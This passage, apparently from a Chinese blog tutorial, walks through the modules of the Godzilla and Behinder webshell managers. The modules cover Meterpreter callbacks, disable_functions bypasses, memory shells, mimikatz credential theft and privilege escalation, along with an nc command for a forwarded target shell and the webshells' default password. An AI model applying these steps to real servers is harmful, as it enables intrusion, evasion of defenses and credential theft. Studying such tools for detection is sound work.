+<p>点击右下角<code>DbinfoConfig</code>配置服务器信息,注意点是要<strong>填写127.0.0.1</strong>,因为此时我们正在该服务器上使用服务,填写该服务器IP如<code>192.168.0.123</code>的话,若该服务器不允许远程登录<code>MySQL</code>则会失败</p>
+<p>之后点击左侧列表或使用下方<code>Exec SQl</code>都可操作数据库</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202514.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202259.png" data-fancybox="true"/></div></div>
+
+<h5 id="网络详情"><a href="#网络详情" class="headerlink" title="网络详情"></a>网络详情</h5><p>相当于在目标机上使用<code>netstat -an</code>查看网络连接情况,如正在监听的端口、外连等</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202206.png" data-fancybox="true"/></div></div>
+
+<h5 id="Zip"><a href="#Zip" class="headerlink" title="Zip"></a>Zip</h5><p>将目标文件夹压缩为压缩文件,或将压缩文件进行解压</p>
+<p>设置目标文件夹再设置压缩后的名称即可压缩文件,设置压缩文件再设置解压的目标文件夹即可解压.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202727.png" data-fancybox="true"/></div></div>
+
+<h5 id="PSuperServer"><a href="#PSuperServer" class="headerlink" title="PSuperServer"></a>PSuperServer</h5><p>该模块作者GitHub没有说明,经过摸索发现为<code>ntunnel</code>隧道</p>
+<p>该模块应该是一个<code>Navicat</code>的<code>ntunnel_mysql.php</code>的集成模块,将<code>Navicat</code>目录下的<code>ntunnel_mysql.php</code>上传到目标服务器</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202617.png" data-fancybox="true"/></div></div>
+
+<p>然后<code>Navicat</code>新建连接,常规中照常设置,注意点为主机地址需设置为<code>127.0.0.1</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202098.png" data-fancybox="true"/></div></div>
+
+<p>在HTTP中勾选如下两个选项,然后输入<code>ntunnel_mysql.php</code>的地址,这里要选择<code>base64</code>编码,否则容易被防护软件拦截.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202309.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202668.png" data-fancybox="true"/></div></div>
+
+<h5 id="PWebShellScan"><a href="#PWebShellScan" class="headerlink" title="PWebShellScan"></a>PWebShellScan</h5><p>根据常见特征扫描指定文件夹下有无<code>WebShell</code>,并且尝试获取<code>WebShell</code>密码,设置好目标目录后,点击<code>scan</code>按钮即可扫描,经测试,无法扫描到如冰蝎木马的加密<code>WebShell</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203284.png" data-fancybox="true"/></div></div>
+
+<h5 id="PMeterpreter"><a href="#PMeterpreter" class="headerlink" title="PMeterpreter"></a>PMeterpreter</h5><p><code>msfconsole</code></p>
+<p>MSF设置监听<code>0.0.0.0：4444</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203786.png" data-fancybox="true"/></div></div>
+
+<p>填写<code>MSF</code>服务器的<code>IP</code>和<code>MSF</code>监听的端口,点击<code>Go</code>发现<code>Meterpreter</code>上线</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203415.png" data-fancybox="true"/></div></div>
+
+<h5 id="BypassOpenBasedir"><a href="#BypassOpenBasedir" class="headerlink" title="BypassOpenBasedir"></a>BypassOpenBasedir</h5><p>模块功能为绕过<code>Open_basedir</code>限制,<code>Open_basedir</code>为<code>php.ini</code>中的一个配置选项,将用户访问文件的活动范围限制在指定的区域.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203701.png" data-fancybox="true"/></div></div>
+
+<h5 id="PAttackFPM"><a href="#PAttackFPM" class="headerlink" title="PAttackFPM"></a>PAttackFPM</h5><p>该模块专门攻击<code>php-fpm</code>,<code>php-fpm</code>是<code>FastCGI</code>进程管理器,它包含一个高级处理功能,可以启动任何任务,然后关闭该任务,且过程中不会有任何阻碍.</p>
+<p><code>php.ini</code>中的<code>disable_functions</code>配置禁用了<code>putenv()</code>、<code>mail() </code>、<code>pcntl_exec()</code>等函数,环境是<code>PHP5.6</code>,导致很多常规<code>Bypass</code>的方法都用不了</p>
+<p>而<code>PAttackFPM</code>模块可与<code>BypassDisable_functions</code>模块作为组合拳使用,作用是绕过限制执行命令,条件是网站为<strong>Linux 操作系统</strong>且由<strong>Nginx+PHP5.6</strong>搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux操作系统</span><br><span class="line">PHP-FPM</span><br><span class="line">Nginx+PHP5.6</span><br></pre></td></tr></table></figure>
+
+<h5 id="BypassDisableFunctions"><a href="#BypassDisableFunctions" class="headerlink" title="BypassDisableFunctions"></a>BypassDisableFunctions</h5><p>模块功能为绕过<code>DisableFunctions</code>,管理员如果设置<code>DisableFunctions</code>则<code>WebShell</code>会无法执行系统命令,该模块提供了一种绕过方式.</p>
+<p>使用可见<code>PAttackFPM</code>,其他子模块中</p>
+<p><strong>EnvBypass</strong>条件：</p>
+<p>利用<code>LD_PRELOAD</code>环境变量绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">能够上传自己的.so文件</span><br><span class="line"></span><br><span class="line">能够控制LD_PRELOAD环境变量的值,比如putenv()函数</span><br><span class="line"></span><br><span class="line">因为新进程启动将加载LD_PRELOAD中的.so文件,所以要存在可以控制PHP启动外部程序的函数并能执行,比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</span><br></pre></td></tr></table></figure>
+
+<p><strong>AMCBypass</strong>条件：</p>
+<p>利用<code>Apache_mod_cgi</code>绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux 操作系统</span><br><span class="line">Apache + PHP (apache 使用 apache_mod_php)</span><br><span class="line">Apache 开启了cgi、rewrite</span><br><span class="line">Web 目录给了AllowOverride权限</span><br><span class="line">当前目录可写</span><br></pre></td></tr></table></figure>
+
+<h5 id="P-Eval-Code"><a href="#P-Eval-Code" class="headerlink" title="P_Eval_Code"></a>P_Eval_Code</h5><p>一个内置代码编译器</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203871.png" data-fancybox="true"/></div></div>
+
+<h5 id="PortScan"><a href="#PortScan" class="headerlink" title="PortScan"></a>PortScan</h5><p>哥斯拉在对方主机产生一个扫描进程,扫描开放端口,在目标主机发现新增一个端口连接<code>TCP 192.168.0.107:80 192.168.0.111:7031 ESTABLISHED 85848</code>扫描进程名<code>httpd.exe</code>,通过Apache进程完成的扫描,扫描结束后该端口连接断开.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203578.png" data-fancybox="true"/></div></div>
+
+<h5 id="RealCmd"><a href="#RealCmd" class="headerlink" title="RealCmd"></a>RealCmd</h5><p>在本地攻击机开放一个端口,将目标主机权限转发给本地攻击机端口</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203737.png" data-fancybox="true"/></div></div>
+
+<p><strong>对方如果是Windows<code>exec file</code>就写<code>cmd</code>,Linux就写<code>/bin/bash</code></strong></p>
+<p><strong>本地攻击机使用nc连接</strong>,成功连接到目标主机,攻击机关闭窗口后该连接自动关闭.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc64.exe 127.0.0.1 4444</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203873.png" data-fancybox="true"/></div></div>
+
+<h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><p><code>JSP</code>的模块和<code>PHP</code>的不太一样,多了<code>Screen</code>(屏幕截图)、<code>Jrealcmd</code>(虚拟终端)、<code>MemoryShell</code>(内存Shell)、<code>ServletManage</code>(Servlet木马管理)、<code>JarLoader</code>(内存加载Jar)、<code>mimikatz</code>(抓取密码)等模块.</p>
+<p><code>RealCmd</code>、<code>PortScan</code>、<code>JMeterpreter</code>、<code>SuperTerminal</code>、<code>Zip</code>与<code>PHP</code>模块用法一致.</p>
+<h5 id="基础信息-1"><a href="#基础信息-1" class="headerlink" title="基础信息"></a>基础信息</h5><p>提供了物理路径、真实IP地址、系统版本、插件目录、JDK版本以及各种配置信息.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203685.png" data-fancybox="true"/></div></div>
+
+<h5 id="MemoryShell"><a href="#MemoryShell" class="headerlink" title="MemoryShell"></a>MemoryShell</h5><p>内存<code>Shell</code>模块,在服务器中注册、卸载内存马</p>
+<p>可以注册一个哥斯拉的马或者冰蝎、蚁剑的马,甚至是<code>Regeorg</code>,在指定目录下注册生成一个木马文件,然后成功连接该木马；</p>
+<p>删除该木马文件时点击<code>unLoadMemoryShell</code>然后输入<code>Shell</code>目录即可</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203715.png" data-fancybox="true"/></div></div>
+
+<h5 id="EnumDatabaseConn"><a href="#EnumDatabaseConn" class="headerlink" title="EnumDatabaseConn"></a>EnumDatabaseConn</h5><p>该模块会尝试得到数据库的连接驱动、账户与密码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203431.png" data-fancybox="true"/></div></div>
+
+<h5 id="Screen"><a href="#Screen" class="headerlink" title="Screen"></a>Screen</h5><p>屏幕截图,Windows上需要高权限(<code>NT SYSTEM</code>).</p>
+<h5 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h5><p><code>PrintSpoofer</code>提权模块,利用<code>SeImpersonatePrivilege</code>(身份验证后模拟客户端)权限来尝试获取<code>SYSTEM</code>权限</p>
+<h5 id="ServletManage"><a href="#ServletManage" class="headerlink" title="ServletManage"></a>ServletManage</h5><p>作用是管理<code>Servlet</code>,可获取和卸载<code>Servlet</code>,方便管理内存<code>Shell</code>.</p>
+<p><code>Servlet</code>是在服务器上运行的小程序,<code>Servlet</code>虽然被称作”小程序”,但是它的功能却异常强大,因为它是基于<code>Java</code>的,几乎可以使用所有的<code>Java API</code>,<code>Java</code> 能做的事情<code>Servlet</code>也能做.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203031.png" data-fancybox="true"/></div></div>
+
+<h5 id="ShellcodeLoader"><a href="#ShellcodeLoader" class="headerlink" title="ShellcodeLoader"></a>ShellcodeLoader</h5><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204209.png" data-fancybox="true"/></div></div>
+
+<p><code>memoryPe</code>是内存PE模块,加载PE并注入.</p>
+<h5 id="JarLoader"><a href="#JarLoader" class="headerlink" title="JarLoader"></a>JarLoader</h5><p>用途为加载jar包,主要是加载<code>jdbc</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204626.png" data-fancybox="true"/></div></div>
+
+<h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><p>集成<code>mimikatz</code>,功能为抓密码凭证,现已更名为<code>kiwi</code>,需要较高权限</p>
+<h3 id="冰蝎-Benhinder"><a href="#冰蝎-Benhinder" class="headerlink" title="冰蝎(Benhinder)"></a>冰蝎(Benhinder)</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>相对于菜刀和蚁剑,冰蝎的特点是动态二进制加密实现新型一句话木马,它的数据是加密传输的</p>
+<p>冰蝎项目地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder</span><br></pre></td></tr></table></figure>
+
+<p>所需环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">客户端：jre11及以上</span><br><span class="line">服务端：.net 2.0+;php 5.3-7.4;java 6+</span><br></pre></td></tr></table></figure>
+
+<h4 id="文件介绍"><a href="#文件介绍" class="headerlink" title="文件介绍"></a>文件介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Behinder.jar		冰蝎客户端,双击即可打开冰蝎</span><br><span class="line">Plugins              插件目录</span><br><span class="line">server文件夹		  存放常见语言的WebShell</span><br><span class="line">data.db				数据库文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="新建连接"><a href="#新建连接" class="headerlink" title="新建连接"></a>新建连接</h4><p>右键-&gt;新增,输入<code>WebShell</code>信息,若使用冰蝎自带的<code>WebShell</code>则默认密码为<code>rebeyond</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204924.png" data-fancybox="true"/></div></div>
+
+<h4 id="修改默认密码"><a href="#修改默认密码" class="headerlink" title="修改默认密码"></a>修改默认密码</h4><p>冰蝎<code>WebShell</code>默认密码均为 <code>rebeyond</code> ,为32位md5值的前16位,若要修改为<code>Shell</code>,则在MD5网站查询md5值,将32位md5前16位截取下来即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2591c98b70119fe624898b1e424b5e91	前16位截取下来</span><br><span class="line">2591c98b70119fe6				   Shell</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204078.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204242.png" data-fancybox="true"/></div></div>
+
+<h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><p>冰蝎默认木马会弹出<code>phpinfo</code>信息,可以通过<code>phpinfo</code>收集服务器信息</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204320.png" data-fancybox="true"/></div></div>
+
+<h4 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h4><p>一个终端窗口,调用的是服务器的<code>cmd</code>窗口</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204645.png" data-fancybox="true"/></div></div>
+
+<h4 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h4><p>虚拟终端提供一个交互式的真实终端,相当于把服务器侧的Shell给搬到了客户端,在这个Shell里可以执行各种需要交互式的命令,如ssh、mysql,还可以执行python、vim、top等操作</p>
+<p>虚拟终端和命令执行不同点在于虚拟终端使用完毕需要点击”<strong>停止</strong>“按钮来关闭服务器的Shell进程</p>
+<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><p>可在<code>/bin/bash</code>下使用如<code>SSH</code>、<code>MySql</code>,还可以执行<code>Python</code>、<code>VIM</code>、<code>TOP</code>等命令</p>
+<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p>默认为<code>cmd.exe</code>,启动后若目标服务器为Win7则会在服务器生成一个文件夹(&#x3D;&#x3D;win10不会生成文件&#x3D;&#x3D;)</p>
+<p>Win10下<code>cmd.exe</code>、<code>powerShell.exe</code>均可执行命令,Win7下仅<code>cmd.exe</code>可执行命令.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204742.png" data-fancybox="true"/></div></div>
+
+<h4 id="文件管理-1"><a href="#文件管理-1" class="headerlink" title="文件管理"></a>文件管理</h4><p>可对文件进行上传、下载、新建、修改时间戳等操作</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204621.png" data-fancybox="true"/></div></div>
+
